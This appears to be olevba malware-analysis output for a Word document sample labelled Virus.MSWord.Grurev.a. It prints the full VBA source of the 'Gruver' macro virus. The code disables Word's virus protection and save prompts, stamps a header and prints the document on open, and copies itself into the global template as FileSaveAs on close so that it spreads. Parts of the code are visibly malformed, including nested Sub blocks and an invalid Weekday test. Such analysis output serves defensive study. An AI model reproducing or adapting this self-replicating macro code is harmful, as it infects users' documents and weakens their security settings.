olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Grurev.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Grurev.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Salvar.bas 
in file: Virus.MSWord.Grurev.a - OLE stream: 'Macros/VBA/Salvar'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Gruver.bas 
in file: Virus.MSWord.Grurev.a - OLE stream: 'Macros/VBA/Gruver'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Nome do virus: Gruver
'Escrito por : Brasileiro.
'==============================================
'Brasil um pais maravilhoso.
'----------------------------------------------

Dim Dia As Boolean
Option Base 1

Sub GruverRuns()
    On Error Resume Next
    
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
        
  Dim nor$
Dim doc$
Dim tem$
Dim mac$
Dim em
Dim ar$(2)
Sub AutoOpen()
MsgBox " Virus Gruver ativado."

    
    On Error Resume Next
   
    If Weekday(Now())("w", 1, 2, 3, 4, 5, 6, 7) Then
        ActiveDocument.Sections(1).Footers(wdHeaderFooterPrimary).Range _
    .InsertDateTime DateTimeFormat:="dd MMMM, yyyy", _
    InsertAsField:=True
        
        With ActiveDocument.Sections(1).Headers(wdHeaderFooterPrimary).Range
            .Font.Size = 14
            .ParagraphFormat.Alignment = wdAlignParagraphCenter
            .Text = "Gruver é um macro virus"
        End With
        ActiveDocument.PrintOut
    End If
    
     ActiveDocument.Save
End Sub

Sub ToolsMacro()
    On Error Resume Next
    Application.DisplayStatusBar = False
    

End Sub

Sub AutoClose()
    
On Error Resume Next

MsgBox "  Macro virus Gruver "
iMacroCount = WordBasic.CountMacros(0, 0)
'Gruver
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "Gruver" Then
        binstalled = -1
    End If
    If WordBasic.[MacroName$](i, 0, 0) = "FileSaveAs" Then
        bTooMuchTrouble = -1
    End If
Next i
If Not binstalled And Not bTooMuchTrouble Then
    'add FileSaveAs and copies of FileSaveAs and AutoClose
    'Gruver é um  macro virus de word
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":Gruver"
    WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
    sMacro$ = sMe$ + ":AutoClose"
    WordBasic.MacroCopy sMacro$, "Global:Gruver"
    
End If
Abort:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
+----------+--------------------+---------------------------------------------+

